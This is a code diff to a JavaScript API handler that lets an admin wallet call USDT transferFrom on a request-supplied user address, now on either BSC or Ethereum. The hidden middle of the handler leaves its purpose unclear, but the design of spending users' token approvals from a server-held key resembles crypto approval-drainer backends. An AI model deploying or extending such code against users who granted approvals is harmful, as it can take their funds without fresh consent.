@@ -21,9 +21,9 @@ export default async function handler(req, res) {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const { userAddress, amount } = req.body;
+    const { userAddress, amount, network } = req.body;
 
-    if (!userAddress || !amount) {
+    if (!userAddress || !amount || !network) {
         return res.status(400).json({ success: false, error: 'Missing required parameters' });
     }
 
@@ -36,15 +36,31 @@ export default async function handler(req, res) {
             return res.status(400).json({ success: false, error: 'Amount must be a number' });
         }
 
-        const { RPC_URL, ADMIN_PRIVATE_KEY, USDT_ADDRESS_BEP } = process.env;
-        if (!RPC_URL || !ADMIN_PRIVATE_KEY || !USDT_ADDRESS_BEP) {
-            return res.status(500).json({ error: 'Missing environment variables' });
+        // Select environment variables based on network
+        let RPC_URL, ADMIN_PRIVATE_KEY, USDT_ADDRESS, explorerBaseUrl;
+
+        if (network === 'bep-20') {
+            RPC_URL = process.env.BSC_RPC_URL;
+            ADMIN_PRIVATE_KEY = process.env.BSC_ADMIN_PRIVATE_KEY;
+            USDT_ADDRESS = process.env.USDT_ADDRESS_BEP;
+            explorerBaseUrl = 'https://bscscan.com/tx/';
+        } else if (network === 'erc-20') {
+            RPC_URL = process.env.ETH_RPC_URL;
+            ADMIN_PRIVATE_KEY = process.env.ETH_ADMIN_PRIVATE_KEY;
+            USDT_ADDRESS = process.env.USDT_ADDRESS_ERC;
+            explorerBaseUrl = 'https://etherscan.io/tx/';
+        } else {
+            return res.status(400).json({ success: false, error: 'Unsupported network' });
+        }
+
+        if (!RPC_URL || !ADMIN_PRIVATE_KEY || !USDT_ADDRESS) {
+            return res.status(500).json({ error: 'Missing environment variables for selected network' });
         }
 
         const provider = new ethers.JsonRpcProvider(RPC_URL);
         const adminWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
 
-        const USDT = new ethers.Contract(USDT_ADDRESS_BEP, [
+        const USDT = new ethers.Contract(USDT_ADDRESS, [
             "function transferFrom(address from, address to, uint256 value) public returns (bool)",
             "function allowance(address owner, address spender) view returns (uint256)"
         ], adminWallet);
@@ -72,7 +88,7 @@ export default async function handler(req, res) {
         return res.json({
             success: true,
             txHash: tx.hash,
-            explorerUrl: `https://bscscan.com/tx/${tx.hash}`
+            explorerUrl: `${explorerBaseUrl}${tx.hash}`
         });
 
     } catch (err) {
